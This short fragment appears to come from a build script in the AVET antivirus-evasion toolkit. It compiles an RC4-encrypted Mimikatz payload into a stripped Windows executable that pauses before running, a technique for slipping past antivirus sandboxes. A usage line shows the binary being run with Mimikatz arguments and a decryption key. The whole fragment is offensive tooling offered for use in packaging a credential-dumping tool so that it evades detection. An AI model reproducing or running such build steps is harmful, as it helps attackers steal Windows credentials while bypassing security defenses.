...
#DESCRIPTION_START
# Calls system("pause") and waits for keypress before executing the payload.
...
# compile to exe file
$win64_compiler -o output/pause_rc4_mimikatz.exe source/avet.c
strip output/pause_rc4_mimikatz.exe
...
# $ pause_rc4_mimikatz_win64.exe [your mimikatz arguments, probably 'coffee']  [decryption key]
"
